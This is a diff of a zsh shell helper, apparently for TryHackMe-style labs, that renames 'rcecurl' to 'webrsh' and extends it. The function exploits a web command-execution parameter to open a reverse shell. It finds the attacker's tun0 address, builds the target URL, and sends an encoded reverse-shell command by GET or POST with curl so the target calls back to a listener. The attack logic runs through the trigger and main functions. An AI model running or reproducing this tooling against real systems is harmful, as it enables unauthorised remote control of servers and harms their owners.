@@ -1,6 +1,62 @@
 # ========================
-# reverse shell helper
+# reverse shell helper (webrsh)
 # ========================
+
+_webrsh-param-default() {
+  echo "${WEBRSH_PARAM:-${RCECURL_PARAM:-cmd}}"
+}
+
+_webrsh-method-default() {
+  echo "${(U)${WEBRSH_METHOD:-${RCECURL_METHOD:-GET}}}"
+}
+
+_webrsh-resolve-url() {
+  local spec="$1"
+  local ip
+
+  if [[ "$spec" == http://* || "$spec" == https://* ]]; then
+    print -r -- "$spec"
+    return 0
+  fi
+
+  ip="$(_recon-ip-default 2>/dev/null)" || {
+    echo "[-] webrsh: no \$IP (ts <ip> / cs <case> first)" >&2
+    return 1
+  }
+
+  python3 - "$ip" "$spec" <<'PY'
+import re
+import sys
+
+ip, spec = sys.argv[1], sys.argv[2].strip()
+if not spec:
+    sys.exit(2)
+
+def path_from_tail(tail: str) -> str:
+    tail = (tail or "").strip("/")
+    return f"/{tail}" if tail else "/"
+
+if spec.startswith(":"):
+    m = re.match(r"^:(\d+)(?:/(.*))?$", spec)
+    if not m:
+        sys.exit(2)
+    port = int(m.group(1))
+    path = path_from_tail(m.group(2))
+    scheme = "https" if port == 443 else "http"
+    if port in (80, 443):
+        print(f"{scheme}://{ip}{path}")
+    else:
+        print(f"{scheme}://{ip}:{port}{path}")
+    sys.exit(0)
+
+path = spec if spec.startswith("/") else f"/{spec}"
+print(f"http://{ip}{path}")
+PY
+}
+
+_webrsh-is-target() {
+  [[ -n "${1:-}" && "${1:-}" != -* ]]
+}
 
 # LHOST for reverse shells (TryHackMe VPN → tun0)
 _revshell-lhost() {
@@ -12,9 +68,11 @@ _revshell-lhost() {
   return 1
 }
 
-_rcecurl-trigger() {
+_webrsh-trigger() {
   local target="$1"
   local port="${2:-4444}"
+  local param="${3:-$(_webrsh-param-default)}"
+  local method="${(U)${4:-$(_webrsh-method-default)}}"
   local lhost
 
   lhost="$(_revshell-lhost)" || {
@@ -26,35 +84,109 @@ _rcecurl-trigger() {
   local enc
   enc=$(python3 -c 'import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))' "$cmd")
 
-  echo "[*] LHOST=$lhost port=$port" >&2
-  echo "[*] GET ${target}?cmd=..." >&2
-  curl -sS "${target}?cmd=${enc}"
+  echo "[*] LHOST=$lhost port=$port method=${method} param=${param}" >&2
+
+  case "$method" in
+    GET)
+      echo "[*] GET ${target}?${param}=..." >&2
+      curl -sS "${target}?${param}=${enc}"
+      ;;
+    POST)
+      echo "[*] POST ${target} (${param}=...)" >&2
+      curl -sS -X POST --data-urlencode "${param}=${cmd}" "$target"
+      ;;
+    *)
+      echo "[-] webrsh: unknown method: $method (use GET or POST)" >&2
+      return 1
+      ;;
+  esac
   echo ""
 }
 
-rcecurl() {
-  if [[ "$1" == "--help" || "$1" == "-h" ]]; then
-    echo "usage: rcecurl <target_url> [port]"
-    echo "send reverse shell via RCE (tun0 auto IP)"
-    echo "default port: 4444"
-    return 0
-  fi
+webrsh() {
+  local param="$(_webrsh-param-default)"
+  local method="$(_webrsh-method-default)"
+  local target_spec="" target="" listen_port="4444"
 
-  local target="$1"
-  local port="${2:-4444}"
+  (( $+functions[target-load] )) && [[ -z "${IP:-}" ]] && target-load 2>/dev/null
 
-  if [[ -z "$target" ]]; then
-    echo "usage: rcecurl <target_url> [port]"
+  while [[ $# -gt 0 ]]; do
+    case "$1" in
+      -h|--help)
+        echo "usage: webrsh [options] [path|url]"
+        echo "web RCE → reverse shell (tun0 auto LHOST)"
+        echo "  path/url uses \$IP when omitted:"
+        echo "    /home.php  home.php  :8080/home.php  http://host/shell.php"
+        echo ""
+        echo "options:"
+        echo "  -X, --method METHOD   GET (default) or POST (or \$WEBRSH_METHOD)"
+        echo "  --post                shortcut for -X POST"
+        echo "  -p, --param NAME      RCE parameter (default: cmd, or \$WEBRSH_PARAM)"
+        echo "  -P, --listen-port N   revshell listener port (default: 4444)"
+        echo ""
+        echo "examples:"
+        echo "  webrsh /home.php -p command -X POST"
+        echo "  webrsh home.php -p command --post"
+        echo "  webrsh :8080/home.php -p command -X POST -P 5555"
+        echo "  webrsh http://\$IP/shell.php"
+        echo ""
+        echo "alias: rcecurl (deprecated)"
+        return 0
+        ;;
+      -X|--method|--request)
+        method="${(U)2}"
+        shift 2
+        ;;
+      --post)
+        method=POST
+        shift
+        ;;
+      -p|--param)
+        param="$2"
+        shift 2
+        ;;
+      -P|--listen-port|--port)
+        listen_port="$2"
+        shift 2
+        ;;
+      *)
+        if _webrsh-is-target "$1"; then
+          if [[ -n "$target_spec" ]]; then
+            echo "[-] webrsh: multiple targets: ${target_spec} and $1" >&2
+            return 1
+          fi
+          target_spec="$1"
+        else
+          echo "usage: webrsh [options] [path|url]" >&2
+          return 1
+        fi
+        shift
+        ;;
+    esac
+  done
+
+  if [[ -z "$target_spec" ]]; then
+    echo "usage: webrsh [options] [path|url]" >&2
     return 1
   fi
 
-  _rcecurl-trigger "$target" "$port"
+  target="$(_webrsh-resolve-url "$target_spec")" || return 1
+
+  _webrsh-trigger "$target" "$listen_port" "$param" "$method"
 }
 
-_rcecurl() {
+# backward-compatible names
+_rcecurl-trigger() { _webrsh-trigger "$@" }
+rcecurl() { webrsh "$@" }
+
+_webrsh() {
   _arguments \
-    '1:target url:_urls' \
-    '2:port:(4444 5555 6666)'
+    '-X[HTTP method]:method:(GET POST)' \
+    '--post[use POST]' \
+    '-p[RCE parameter name]:param name:(cmd command)' \
+    '-P[revshell listener port]:port:(4444 5555 6666)' \
+    '1:path or url:(/home.php home.php :8080/home.php)' \
+    '*:path or url:(/home.php home.php :8080/home.php)'
 }
 
-compdef _rcecurl rcecurl
+compdef _webrsh webrsh rcecurl
